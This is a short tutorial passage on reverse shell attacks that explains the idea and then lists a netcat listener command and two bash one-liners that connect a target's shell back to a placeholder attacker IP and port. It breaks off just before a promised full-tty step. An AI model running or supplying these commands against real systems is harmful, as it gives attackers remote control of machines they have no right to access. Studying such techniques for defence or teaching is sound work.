This part is mainly discussed about reverse shell attack.

Reverse shell attack is that attacker opens the port on its attack host, then the target host executes the malicious command to
connect to the port of the attack host actively.As attacker gets the shell of the target, then attacker can control and access the
resource of the target.

1.The command on the attack host:
nc -lvnp {port_number}

2.The malicious RCE command on the target:
2-1.Linux:
2-1-1./bin/bash -i>/dev/tcp/{Attacker_IP}/{Attacker_Port} 0<&1 2>&1
2-1-2./bin/bash -c '/bin/bash -i>/dev/tcp/{Attacker_IP}/{Attacker_Port} 0<&1 2>&1'
2-1-3.If attacker would like to control the target in full-tty mode, u could do below command to do that.
